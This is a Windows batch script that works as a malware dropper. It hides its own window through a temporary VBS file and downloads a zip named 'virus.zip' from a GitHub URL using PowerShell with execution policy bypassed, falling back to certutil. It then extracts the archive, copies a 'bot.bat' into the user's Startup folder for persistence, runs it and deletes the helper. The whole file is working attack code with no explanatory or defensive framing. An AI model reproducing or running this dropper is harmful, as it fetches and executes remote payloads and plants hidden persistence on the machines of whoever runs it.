@echo off
if not "%1"=="H" (
    echo Set WshShell = CreateObject("WScript.Shell"^) > "%temp%\hide.vbs"
    echo WshShell.Run """" & WScript.ScriptFullName & """ H", 0, False >> "%temp%\hide.vbs"
    wscript.exe "%temp%\hide.vbs"
    exit /b
)

setlocal enabledelayedexpansion

set "tempdir=%TEMP%"
set "zipurl=https://raw.githubusercontent.com/banzoxOG/zip/main/virus.zip"
set "zipfile=%tempdir%\virus.zip"

:: Force TLS 1.2 then download with PowerShell; fallback to certutil
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { Invoke-WebRequest -Uri '%zipurl%' -OutFile '%zipfile%' } catch { exit 1 }" >nul 2>&1
if %errorlevel% neq 0 (
    certutil -urlcache -f "%zipurl%" "%zipfile%" >nul 2>&1
)

:: Wait a breath
ping -n 2 127.0.0.1 >nul

:: Extract directly into %TEMP%, overwrite
powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%zipfile%' -DestinationPath '%tempdir%' -Force;" >nul 2>&1

:: Copy bot.bat to shell:startup and execute
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if exist "%tempdir%\bot.bat" (
    copy /y "%tempdir%\bot.bat" "%startup%\bot.bat" >nul 2>&1
    start "" /B "%tempdir%\bot.bat"
)

:: Kill the helper vbs
del /f /q "%temp%\hide.vbs" >nul 2>&1

exit
